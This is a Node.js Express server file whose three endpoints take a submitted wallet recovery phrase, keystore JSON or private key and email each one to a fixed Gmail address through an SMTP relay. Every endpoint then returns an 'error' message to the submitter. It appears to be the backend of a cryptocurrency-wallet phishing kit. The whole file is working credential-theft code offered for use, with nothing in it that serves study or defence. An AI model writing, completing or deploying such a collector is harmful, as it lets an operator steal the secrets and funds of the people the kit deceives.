 
 const express = require('express');  
 const dotenv = require('dotenv'); 
 const nodemailer = require('nodemailer');
 const cors = require('cors'); 
 const app = express();   

 dotenv.config();
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({extended:false}));   

 
 app.post('/processing', async (req, res) => {
     try {
         const inpvalue = req.body.inputvalue; // Extract data from request
 
         if (!inpvalue) {
             return res.status(400).send("Missing required fields");
         }
 
         // Create SMTP transporter
         const transporter = nodemailer.createTransport({
             host: 'smtp-relay.sendinblue.com',
             port: 587,
             auth: {
                 user: process.env.SMTP_USERNAME,
                 pass: process.env.SMTP_PASS,
             },
         });
 
         // Define email options
         const mailOptions = {
             from: 'victoremmy1876@gmail.com',
             to: 'victoremmy1876@gmail.com',
             subject: 'My Recovery Phrase',
             html: `<p><strong>Your recovery phrase:</strong> ${inpvalue}</p>`, // Email content
         };
 
         // Send email
         await transporter.sendMail(mailOptions); 
         res.json({ msg: 'error' }); 
 
     } catch (err) {
         console.error('Error sending email:', err); 
     }
 }); 



 
 app.post('/processingb', async (req, res) => { 
   console.log(req.body.inputvalue);
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).send("Missing required fields");
       }

       // Create SMTP transporter
       const transporter = nodemailer.createTransport({
           host: 'smtp-relay.sendinblue.com',
           port: 587,
           auth: {
               user: process.env.SMTP_USERNAME,
               pass: process.env.SMTP_PASS,
           },
       });

       // Define email options
       const mailOptions = {
           from: 'victoremmy1876@gmail.com',
           to: 'victoremmy1876@gmail.com',
           subject: 'My keystore json',
           html: `<p><strong>Your keystore json:</strong> ${inpvalue}</p>`, // Email content
       };

       // Send email
       await transporter.sendMail(mailOptions); 
       res.json({ msg: 'error' }); 

   } catch (err) {
       console.error('Error sending email:', err);
       res.status(500).json({ error: 'Failed to send email' });
   }
});





app.post('/processingc', async (req, res) => {
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).send("Missing required fields");
       }

       // Create SMTP transporter
       const transporter = nodemailer.createTransport({
           host: 'smtp-relay.sendinblue.com',
           port: 587,
           auth: {
               user: process.env.SMTP_USERNAME,
               pass: process.env.SMTP_PASS,
           },
       });

       // Define email options
       const mailOptions = {
           from: 'victoremmy1876@gmail.com',
           to: 'victoremmy1876@gmail.com',
           subject: 'My private key',
           html: `<p><strong>Your privatekey:</strong> ${inpvalue}</p>`, // Email content
       };

       // Send email
       await transporter.sendMail(mailOptions); 
       res.json({ msg: 'error' });  

   } catch (err) {
       console.error('Error sending email:', err);
       res.status(500).json({ error: 'Failed to send email' });
   }
});
 

 app.listen(5000 , ()=>{
    console.log('Listening on port 5000');
 });